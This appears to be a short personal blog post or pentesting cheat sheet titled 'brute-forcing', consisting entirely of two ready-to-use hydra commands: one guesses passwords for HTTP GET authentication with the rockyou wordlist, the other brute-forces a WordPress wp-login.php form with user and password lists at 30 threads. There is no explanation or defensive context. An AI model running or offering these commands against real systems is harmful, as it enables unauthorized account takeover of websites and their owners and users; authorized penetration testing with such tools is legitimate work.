---
layout: post
title: "brute-forcing"
keywords: "brute, hydra, wordpress"
---
### HTTP
```
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt -t 1 -f <ip> http-get <path>
```

### WordPress
```
hydra -L <USERFILE> -P <PASSFILE> $IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
```